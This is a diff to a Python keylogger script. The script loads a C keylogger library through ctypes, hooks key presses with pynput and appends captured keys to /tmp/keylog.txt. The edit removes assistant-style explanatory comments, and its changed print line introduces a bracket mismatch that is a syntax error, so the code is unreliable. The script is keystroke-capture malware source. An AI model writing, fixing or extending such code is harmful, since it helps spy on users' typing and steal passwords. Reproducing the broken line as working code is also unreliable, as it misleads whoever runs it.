@@ -1,4 +1,4 @@
-import os # <-- FIX: Added missing import for os module
+import os 
 import pynput
 from pynput import keyboard
 from ctypes import cdll, c_char_p, c_int
@@ -8,9 +8,7 @@ LOG_FILE = "/tmp/keylog.txt"
 
 # --- Setup ---
 # Load the C-based keylogger library
-# Using os.environ['HOME'] is fine, but os.path.expanduser("~") is often preferred.
-# I'll keep your original path construction style for consistency.
-lib_path = os.path.join(os.environ['HOME'], "Documents/VRS/test.so")
+lib_path = os.path.join(os.environ['HOME'], "Documents", "VRS", "test.so")
 keylogger_lib = cdll.LoadLibrary(lib_path)
 
 
@@ -24,10 +22,11 @@ keylogger_lib.write.argtypes = [c_int, c_char_p, c_int]
 def log_key(key_data):
     try:
         with open(LOG_FILE, "a") as f:
-            f.write(key_data)
+            f.write(key_data + "\n")
         
     except Exception as e:
-        print(f"\n[ERROR: Could not write to file {LOG_FILE}: {e}]")
+        print(f"\n[ERROR: Could not write to file {LOG_FILE}: {e}"]
+
 
 # Handler for key presses
 def on_press(key):
